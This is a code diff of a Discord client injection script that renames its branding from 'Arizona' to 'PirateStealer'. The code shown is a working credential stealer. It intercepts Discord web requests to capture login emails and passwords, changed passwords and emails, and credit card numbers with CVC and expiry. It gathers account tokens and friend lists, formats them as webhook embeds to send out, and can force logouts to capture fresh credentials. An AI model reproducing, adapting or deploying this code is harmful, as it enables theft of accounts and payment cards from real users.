@@ -75,7 +75,7 @@ const badges = {
 };
 
 
-class ArizonaEvent {
+class PirateStealerEvent {
     constructor(event, token, data) {
         this.event = event;
         this.data = data;
@@ -106,7 +106,7 @@ async function firstTime() {
             fs.rmdirSync(path.join(__dirname, "init"));
             if (token == null || token == undefined || token == "") {
                 var c = {
-                    username: "Arizona",
+                    username: "PirateStealer",
                     content: "",
                     embeds: [{
                         title: "Discord Initalized (User not Logged in)",
@@ -117,10 +117,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "Arizona"
+                            name: "PirateStealer"
                         },
                         footer: {
-                            text: "Arizona"
+                            text: "PirateStealer"
                         }
                     }]
                 };
@@ -128,7 +128,7 @@ async function firstTime() {
             } else {
                 var b = await getUserInfo(token)
                 var c = {
-                    username: "Arizona",
+                    username: "PirateStealer",
                     content: "",
                     embeds: [{
                         title: "Discord Initalized",
@@ -156,10 +156,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "Arizona"
+                            name: "PirateStealer"
                         },
                         footer: {
-                            text: "Arizona"
+                            text: "PirateStealer"
                         },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -171,14 +171,14 @@ async function firstTime() {
 
         }
     }
-    if (!fs.existsSync(path.join(__dirname, "ArizonaBTW"))) return !0
+    if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return !0
 
-    fs.rmdirSync(path.join(__dirname, "ArizonaBTW"));
+    fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
     if (config.logout != "false" || config.logout == "%LOGOUT%") {
         if (config['logout-notify'] == "true") {
             if (token == null || token == undefined || token == "") {
                 var c = {
-                    username: "Arizona",
+                    username: "PirateStealer",
                     content: "",
                     embeds: [{
                         title: "User log out (User not Logged in before)",
@@ -189,10 +189,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "Arizona"
+                            name: "PirateStealer"
                         },
                         footer: {
-                            text: "Arizona"
+                            text: "PirateStealer"
                         }
                     }]
                 };
@@ -200,7 +200,7 @@ async function firstTime() {
             } else {
                 const b = await getUserInfo(token);
                 var c = {
-                    username: "Arizona",
+                    username: "PirateStealer",
                     content: "",
                     embeds: [{
                         title: "User got logged out",
@@ -228,10 +228,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "Arizona"
+                            name: "PirateStealer"
                         },
                         footer: {
-                            text: "Arizona"
+                            text: "PirateStealer"
                         },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -306,7 +306,7 @@ async function userLogin(password, email, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "Arizona",
+        username: "PirateStealer",
         content: "",
         embeds: [{
             "title": "User Login",
@@ -350,10 +350,10 @@ async function userLogin(password, email, token) {
                 inline: !1
             }, ],
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -363,10 +363,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -382,10 +382,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             }
         }
         params.embeds.push(embed)
@@ -401,7 +401,7 @@ async function emailChanged(password, newEmail, token) {
 
 
     var params = {
-        username: "Arizona",
+        username: "PirateStealer",
         content: "",
         embeds: [{
             "title": "Email Changed",
@@ -441,10 +441,10 @@ async function emailChanged(password, newEmail, token) {
                 inline: !1
             }, ],
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -454,10 +454,10 @@ async function emailChanged(password, newEmail, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -472,10 +472,10 @@ async function emailChanged(password, newEmail, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             }
         }
         params.embeds.push(embed)
@@ -489,7 +489,7 @@ async function passwordChanged(oldPassword, newPassword, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "Arizona",
+        username: "PirateStealer",
         content: "",
         embeds: [{
             "title": "Password Changed",
@@ -537,10 +537,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
                 inline: !1
             }, ],
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -550,10 +550,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -569,10 +569,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             }
         }
         params.embeds.push(embed)
@@ -586,7 +586,7 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "Arizona",
+        username: "PirateStealer",
         content: "",
         embeds: [{
             "title": "Credit Card",
@@ -640,10 +640,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
                 },
             ],
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -653,10 +653,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "Arizona"
+                "name": "PirateStealer"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "PirateStealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -809,7 +809,7 @@ session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) 
 
     switch (true) {
         case details.url.endsWith('login'):
-            var event = new ArizonaEvent('userLogin', token, {
+            var event = new PirateStealerEvent('userLogin', token, {
                 password: data.password,
                 email: data.login
             });
@@ -818,7 +818,7 @@ session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) 
         case details.url.endsWith('users/@me') && details.method == 'PATCH':
             if (!data.password) return;
             if (data.email) {
-                var event = new ArizonaEvent('emailChanged', token, {
+                var event = new PirateStealerEvent('emailChanged', token, {
                     password: data.password,
                     email: data.email
                 });
@@ -826,7 +826,7 @@ session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) 
 
             };
             if (data.new_password) {
-                var event = new ArizonaEvent('passwordChanged', token, {
+                var event = new PirateStealerEvent('passwordChanged', token, {
                     password: data.password,
                     new_password: data.new_password
                 });
@@ -835,7 +835,7 @@ session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) 
             return;
         case details.url.endsWith('tokens') && details.method == "POST":
             const card = querystring.parse(decodeURIComponent(unparsed_data))
-            var event = new ArizonaEvent('creditCardAdded', token, {
+            var event = new PirateStealerEvent('creditCardAdded', token, {
                 cardnumber: card["card[number]"],
                 cvc: card["card[cvc]"],
                 expiration: card["card[exp_month]"] + "/" + card["card[exp_year]"]
